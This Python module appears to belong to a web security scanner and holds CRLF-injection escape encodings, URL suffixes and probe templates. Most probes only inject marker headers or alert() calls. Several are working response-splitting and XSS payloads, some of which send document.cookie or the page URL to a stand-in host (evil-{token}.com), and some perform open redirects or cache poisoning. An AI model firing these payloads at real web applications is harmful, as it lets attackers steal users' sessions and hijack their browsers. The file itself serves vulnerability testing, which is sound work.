"""CRLF injection escape sequences, suffixes, and probe payloads."""

CRLF_APPEND_SUFFIXES: list[str] = [
    "",
    "crlf",
    "?crlf=",
    "#",
    ";",
    "/%20",
]

CRLF_ESCAPE_SEQUENCES: list[dict[str, str]] = [
    {"crlf_raw": "%0d%0a"},
    {"crlf_upper": "%0D%0A"},
    {"crlf_mixed": "%0D%0a"},
    {"crlf_double": "%250d%250a"},
    {"crlf_n_only": "%0a"},
    {"crlf_r_only": "%0d"},
    {"crlf_n_upper": "%0A"},
    {"crlf_r_upper": "%0D"},
    {"crlf_hash_n": "%23%0a"},
    {"crlf_hash_r": "%23%0d"},
    {"crlf_hash_rn": "%23%0d%0a"},
    {"crlf_unicode_n": "%u000a"},
    {"crlf_unicode_r": "%u000d"},
    {"crlf_utf8_n": "%e0%80%8a"},
    {"crlf_utf8_r": "%e0%80%8d"},
    {"crlf_null_n": "%00%0a"},
    {"crlf_null_r": "%00%0d"},
    {"crlf_tab_n": "%09%0a"},
    {"crlf_tab_r": "%09%0d"},
    {"crlf_space_n": "%20%0a"},
    {"crlf_space_r": "%20%0d"},
]

CRLF_PROBE_PAYLOADS: list[dict[str, str]] = [
    {"name": "set_cookie", "template": "{crlf}Set-Cookie:{space}crlf={token}"},
    {"name": "arbitrary_header", "template": "{crlf}X-CRLF-Test:{space}detected-{token}"},
    {"name": "location_redirect", "template": "{crlf}Location:{space}https://evil-{token}.com"},
    {
        "name": "content_type_override",
        "template": "{crlf}Content-Type:{space}text/html; charset=UTF-8",
    },
    {"name": "x_forwarded_for", "template": "{crlf}X-Forwarded-For:{space}127.0.0.{token}"},
    {"name": "response_split", "template": "{crlf}{crlf}<html>crlf-body-{token}</html>"},
    {"name": "double_crlf_header", "template": "{crlf}{crlf}X-CRLF-Double:{space}injected-{token}"},
    {"name": "custom_header_simple", "template": "{crlf}X-Custom-Test:{space}probed-{token}"},
    {"name": "authorization_inject", "template": "{crlf}Authorization:{space}Bearer crlf-{token}"},
    {
        "name": "cache_control_inject",
        "template": "{crlf}Cache-Control:{space}no-store, crlf={token}",
    },
    {"name": "refresh_header", "template": "{crlf}Refresh:{space}0;url=https://evil-{token}.com"},
    {"name": "status_code_inject", "template": "{crlf}HTTP/1.1 418 I'm a teapot"},
    {
        "name": "xss_via_split",
        "template": "{crlf}{crlf}<script>alert('CRLF-XSS-{token}')</script>",
    },
    {
        "name": "content_length_zero",
        "template": "{crlf}Content-Length:{space}0{crlf}{crlf}HTTP/1.1 200 OK{crlf}Content-Type:{space}text/html{crlf}{crlf}<body>XSS-{token}</body>",
    },
    {
        "name": "full_response_split",
        "template": "{crlf}HTTP/1.1 200 OK{crlf}Content-Type:{space}text/html{crlf}Content-Length:{space}32{crlf}{crlf}<h1>CRLF-XSS-{token}</h1>",
    },
    {
        "name": "x_xss_protection_zero",
        "template": "{crlf}X-XSS-Protection:{space}0{crlf}Content-Type:{space}text/html{crlf}{crlf}<script>alert('{token}')</script>",
    },
    {
        "name": "split_with_xss_redirect",
        "template": "{crlf}Refresh:{space}0;url=javascript:alert('{token}')",
    },
    {
        "name": "split_set_cookie_xss",
        "template": "{crlf}Set-Cookie:{space}malicious={token}; Path=/; HTTPOnly{crlf}Content-Type:{space}text/html{crlf}{crlf}<script>top.location='https://evil-{token}.com/'+document.cookie</script>",
    },
    {
        "name": "cache_poisoning_xss",
        "template": "{crlf}X-Cache:{space}HIT{crlf}Content-Type:{space}text/html{crlf}{crlf}<script>new Image().src='https://evil-{token}.com/?c='+document.cookie</script>",
    },
    {
        "name": "split_meta_redirect",
        "template": "{crlf}{crlf}<meta http-equiv='refresh' content='0;url=javascript:alert(\"{token}\")' />",
    },
    {
        "name": "split_img_onerror",
        "template": "{crlf}{crlf}<img src=x onerror=alert('{token}') />",
    },
    {
        "name": "split_svg_xss",
        "template": "{crlf}Content-Type:{space}image/svg%2bxml{crlf}{crlf}<svg><script>alert('{token}')</script></svg>",
    },
    {
        "name": "split_jsonp_hijack",
        "template": "{crlf}{crlf}<script>window.location='https://evil-{token}.com/?p='+location.href</script>",
    },
    {
        "name": "double_split_xss",
        "template": "{crlf}{crlf}HTTP/1.1 200 OK{crlf}{crlf}<script>alert('Double-{token}')</script>",
    },
    {
        "name": "split_html_inject",
        "template": "{crlf}{crlf}<html><body><h1>CRLF-{token}</h1><p>Injected via response splitting</p></body></html>",
    },
    {
        "name": "location_redirect",
        "template": "%0d%0aLocation:https://evil.com%0d%0a",
    },
    {
        "name": "location_with_tab",
        "template": "%0d%0a\tLocation:https://evil.com%0d%0a",
    },
    {
        "name": "double_location",
        "template": "%0d%0a%0d%0aLocation:https://evil.com",
    },
]
